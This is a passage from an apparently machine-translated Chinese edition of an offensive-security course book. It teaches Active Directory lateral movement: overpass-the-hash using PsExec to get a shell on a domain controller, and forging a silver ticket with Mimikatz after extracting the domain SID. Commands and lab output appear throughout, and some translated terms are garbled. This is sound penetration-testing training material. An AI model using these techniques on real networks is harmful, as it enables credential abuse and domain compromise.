<div style="position:absolute;top:51948;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">微软。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">674</font></font></font></nobr></div>
<div style="position:absolute;top:51981;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PsExec 可以远程运行命令，但不接受密码哈希。</font><font style="vertical-align: inherit;">既然我们有</font></font></nobr></div>
<div style="position:absolute;top:52000;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生成 Kerberos 票证并在 PowerShell 会话中的 Jeff_Admin 上下文中操作，我们</font></font></nobr></div>
<div style="position:absolute;top:52020;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以重用 TGT 来获取域控制器上的代码执行。</font></font></nobr></div>
<div style="position:absolute;top:52052;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在让我们尝试一下，运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">./PsExec.exe</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以</font><font style="vertical-align: inherit;">在</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">\dc01</font></font></b><font style="vertical-align: inherit;">机器</font><font style="vertical-align: inherit;">上远程</font><font style="vertical-align: inherit;">启动</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cmd.exe</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:52072;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">杰夫_管理员：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:52106;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS C:\Tools\active_directory&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.\PsExec.exe \\dc01 cmd.exe</font></font></font></b></nobr></div>
<div style="position:absolute;top:52141;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PsExec v2.2 - 远程执行进程</font></font></nobr></div>
<div style="position:absolute;top:52158;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 (C) 2001-2016 Mark Russinovich</font></font></nobr></div>
<div style="position:absolute;top:52174;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sysinternals - www.sysinternals.com</font></font></nobr></div>
<div style="position:absolute;top:52208;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Windows\system32&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ipconfig</font></font></font></b></nobr></div>
<div style="position:absolute;top:52243;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows IP 配置</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:52319;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">674 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2016 年），https://docs.microsoft.com/en-us/sysinternals/downloads/psexec</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:52447;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="45"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 45 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:52480;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:53557;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:53557;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:53557;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">662</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:52576;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以太网适配器 Ethernet0:</font></font></nobr></div>
<div style="position:absolute;top:52609;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特定于连接的 DNS 后缀。</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
<div style="position:absolute;top:52626;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">链路本地 IPv6 地址。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: fe80::7959:aaad:eec:3969%2</font></font></nobr></div>
<div style="position:absolute;top:52644;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IPv4 地址。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: 192.168.1.110</font></font></nobr></div>
<div style="position:absolute;top:52660;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">子网掩码 。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: 255.255.255.0</font></font></nobr></div>
<div style="position:absolute;top:52677;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认网关 。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: 192.168.1.1</font></font></nobr></div>
<div style="position:absolute;top:52694;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:52728;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Windows\system32&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">whoami</font></font></font></b></nobr></div>
<div style="position:absolute;top:52745;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">corp\jeff_admin</font></font></nobr></div>
<div style="position:absolute;top:52765;left:299"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 705- 使用 Kerberos 打开远程连接</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:52794;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如输出所示，我们已成功重用 Kerberos TGT 来启动命令</font></font></nobr></div>
<div style="position:absolute;top:52813;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域控制器上的外壳。</font></font></nobr></div>
<div style="position:absolute;top:52846;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">优秀的！</font><font style="vertical-align: inherit;">我们已成功将缓存的 NTLM 密码哈希升级为 Kerberos TGT 和</font></font></nobr></div>
<div style="position:absolute;top:52866;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">利用它来获得远程代码执行。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:52900;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.4.2.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:52930;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 执行上面的overpass the hash 攻击并获得一个交互式命令提示符</font></font></nobr></div>
<div style="position:absolute;top:52949;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域控制器。</font><font style="vertical-align: inherit;">确保在启动之前重新启动 Windows 10 客户端</font></font></nobr></div>
<div style="position:absolute;top:52969;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">练习清除任何缓存的 Kerberos 票证。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:53003;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.4.3</font></font></i></nobr></div>
<div style="position:absolute;top:53003;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">过票</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:53041;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在上一节中，我们使用了 overpass 散列技术（以及捕获的 NTLM</font></font></nobr></div>
<div style="position:absolute;top:53060;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hash) 来获取 Kerberos TGT，允许我们使用 Kerberos 进行身份验证。</font><font style="vertical-align: inherit;">我们只能使用</font></font></nobr></div>
<div style="position:absolute;top:53080;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TGT 在其创建的机器上，但 TGS 可能提供更大的灵活性。</font></font></nobr></div>
<div style="position:absolute;top:53113;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通票门票</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击利用了TGS，可以导出并重新注入的</font></font></nobr></div>
<div style="position:absolute;top:53132;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络上的其他地方，然后用于对特定服务进行身份验证。</font><font style="vertical-align: inherit;">此外，如果</font></font></nobr></div>
<div style="position:absolute;top:53151;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务票属于当前用户，则不需要管理权限。</font></font></nobr></div>
<div style="position:absolute;top:53184;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到目前为止，这种攻击没有为我们提供任何额外的访问权限，但它确实提供了灵活性</font></font></nobr></div>
<div style="position:absolute;top:53203;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以选择使用哪台机器的票。</font><font style="vertical-align: inherit;">但是，如果服务注册了</font></font></nobr></div>
<div style="position:absolute;top:53223;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务主体名称，这个场景变得更有趣。</font></font></nobr></div>
<div style="position:absolute;top:53255;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">之前我们演示过可以破解服务账号密码hash并获取</font></font></nobr></div>
<div style="position:absolute;top:53275;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务票据中的密码。</font><font style="vertical-align: inherit;">然后可以使用此密码访问资源</font></font></nobr></div>
<div style="position:absolute;top:53294;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可用于服务帐户。</font></font></nobr></div>
<div style="position:absolute;top:53327;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但是，如果服务帐户不是任何服务器上的本地管理员，我们将无法</font></font></nobr></div>
<div style="position:absolute;top:53346;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用向量执行横向移动，例如传递散列或越过散列，因此，</font></font></nobr></div>
<div style="position:absolute;top:53366;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这些情况下，我们需要使用不同的方法。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:53428;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与 Pass the Hash 一样，Overpass the Hash 也需要访问特殊的</font></font></i></nobr></div>
<div style="position:absolute;top:53447;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名为</font></font><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Admin$ 的</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理共享</font><font style="vertical-align: inherit;">，这反过来需要本地管理权限</font></font></i></nobr></div>
<div style="position:absolute;top:53466;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标机器。 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:53635;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="46"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 46 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:53668;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:54745;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:54745;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:54745;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">663</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:53764;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">记住 Kerberos 身份验证的内部工作原理，即服务器上的应用程序</font></font></nobr></div>
<div style="position:absolute;top:53783;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在服务帐户的上下文中执行从组中检查用户的权限</font></font></nobr></div>
<div style="position:absolute;top:53802;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务票中包含的会员资格。</font><font style="vertical-align: inherit;">服务票据中的用户和组权限</font></font></nobr></div>
<div style="position:absolute;top:53822;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然没有通过应用程序验证。</font><font style="vertical-align: inherit;">应用程序盲目信任服务的完整性</font></font></nobr></div>
<div style="position:absolute;top:53841;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">票证，因为它是用密码哈希加密的 - 理论上 - 只有服务帐户知道并且</font></font></nobr></div>
<div style="position:absolute;top:53861;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域控制器。</font></font></nobr></div>
<div style="position:absolute;top:53893;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，如果我们对在服务上下文中执行的 IIS 服务器进行身份验证</font></font></nobr></div>
<div style="position:absolute;top:53912;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帐户</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iis_service</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，IIS 应用程序将确定我们在 IIS 服务器上拥有哪些权限</font></font></nobr></div>
<div style="position:absolute;top:53932;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">取决于服务票证中存在的组成员身份。</font></font></nobr></div>
<div style="position:absolute;top:53965;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但是，有了服务帐户密码或其关联的 NTLM 哈希值，我们就可以伪造</font></font></nobr></div>
<div style="position:absolute;top:53984;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们自己的服务票来访问目标资源（在我们的示例中为 IIS 应用程序）</font></font></nobr></div>
<div style="position:absolute;top:54004;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们想要的权限。</font><font style="vertical-align: inherit;">这张定制的票被称为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">银票</font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">675</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，如果服务</font></font></nobr></div>
<div style="position:absolute;top:54023;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主体名称在多台服务器上使用，银票可以用于所有服务器。</font></font></nobr></div>
<div style="position:absolute;top:54056;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Mimikatz 可以制作一张银票并通过（有点</font></font></nobr></div>
<div style="position:absolute;top:54075;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">误导）</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kerberos::golden</font></font></font></b><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 676</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令。</font><font style="vertical-align: inherit;">我们将在后面的内容中解释这种明显的错误命名</font></font></nobr></div>
<div style="position:absolute;top:54094;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块。</font></font></nobr></div>
<div style="position:absolute;top:54127;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要创建票证，我们首先需要获取</font><font style="vertical-align: inherit;">域</font><font style="vertical-align: inherit;">的所谓</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安全标识符</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SID </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">677</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:54146;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SID 是 Active Directory 中任何对象的唯一名称，具有以下结构：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:54182;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">资源信息系统</font></font></nobr></div>
<div style="position:absolute;top:54201;left:322"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 706 - 安全标识符格式原型</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:54230;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在此结构中，SID 以文字“S”开头，以将字符串标识为 SID，后跟一个</font></font></nobr></div>
<div style="position:absolute;top:54249;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">修订级别</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（通常设置为“1”）、</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标识符权限</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">值（在 AD 中通常为“5”）和一个或多个</font></font></nobr></div>
<div style="position:absolute;top:54269;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">子权限</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">值。</font></font></nobr></div>
<div style="position:absolute;top:54302;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，实际的 SID 可能如下所示：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:54337;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">S-1-5-21-2536614405-3629634762-1218571035-1116</font></font></nobr></div>
<div style="position:absolute;top:54356;left:351"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 707 - 安全标识符格式</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:54385;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 707 中的第一个值（“S-1-5”）在 AD 中是相当静态的。</font><font style="vertical-align: inherit;">子</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">权限</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">值是动态的</font></font></nobr></div>
<div style="position:absolute;top:54405;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并由两个主要部分组成：域的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数字标识符</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（在本例中为“21-2536614405-</font></font></nobr></div>
<div style="position:absolute;top:54424;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3629634762-1218571035”) 和一个</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">相对标识符</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RID </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">678</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">表示特定对象在</font></font></nobr></div>
<div style="position:absolute;top:54443;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域（在本例中为“1116”）。</font></font></nobr></div>
<div style="position:absolute;top:54476;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域值和相对标识符的组合有助于确保每个 SID</font></font></nobr></div>
<div style="position:absolute;top:54496;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">独特。</font></font></nobr></div>
<div style="position:absolute;top:54528;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">whoami /user</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">轻松获取当前用户的 SID，</font><font style="vertical-align: inherit;">然后提取</font></font></nobr></div>
<div style="position:absolute;top:54548;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域 SID 部分。</font><font style="vertical-align: inherit;">让我们尝试在我们的 Windows 10 客户端上执行此操作：</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:54621;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">675 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（肖恩·梅特卡夫，2016 年），https://adsecurity.org/?p=2011</font></font></font></nobr></div>
<div style="position:absolute;top:54641;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">676 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Benjamin Delpy, 2016)，https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos</font></font></font></nobr></div>
<div style="position:absolute;top:54661;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">677 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（微软，2018 年），https:</font></font><font style="vertical-align: inherit;"> //msdn.microsoft.com/en-us/library/windows/desktop/aa379571 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(v=vs.85).aspx</font></font></font></nobr></div>
<div style="position:absolute;top:54681;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">678 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://msdn.microsoft.com/en-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:54696;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">us/library/windows/desktop/ms721604(v=vs.85).aspx#_security_relative_identifier_gly </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:54823;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="47"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 47 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:54856;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:55933;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:55933;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:55933;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">664</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:54954;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">whoami /user</font></font></font></b></nobr></div>
<div style="position:absolute;top:54988;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户信息</font></font></nobr></div>
<div style="position:absolute;top:55005;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">----------------</font></font></nobr></div>
<div style="position:absolute;top:55039;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户名</font></font></nobr></div>
<div style="position:absolute;top:55056;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">================================================== ========</font></font></nobr></div>
<div style="position:absolute;top:55072;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">corp\offsec </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">S-1-5-21-1602875587-2787523311-2599479668</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> -1103</font></font></nobr></div>
<div style="position:absolute;top:55092;left:351"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 708 - 定位域 SID</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:55121;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">定义域的 SID 是整个字符串，除了末尾的 RID ( </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-1103</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 中突出显示</font></font></nobr></div>
<div style="position:absolute;top:55141;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 708。</font></font></nobr></div>
<div style="position:absolute;top:55174;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们有了域 SID，让我们尝试为我们之前的 IIS 服务制作一张银票</font></font></nobr></div>
<div style="position:absolute;top:55193;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们的专用实验室域中发现。</font></font></nobr></div>
<div style="position:absolute;top:55226;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Silver ticket 命令需要用户名 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/user</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )、域名 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/domain</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )、域 SID</font></font></nobr></div>
<div style="position:absolute;top:55245;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/sid</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )，在上面突出显示，服务的完全限定主机名 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/target</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )，</font></font></nobr></div>
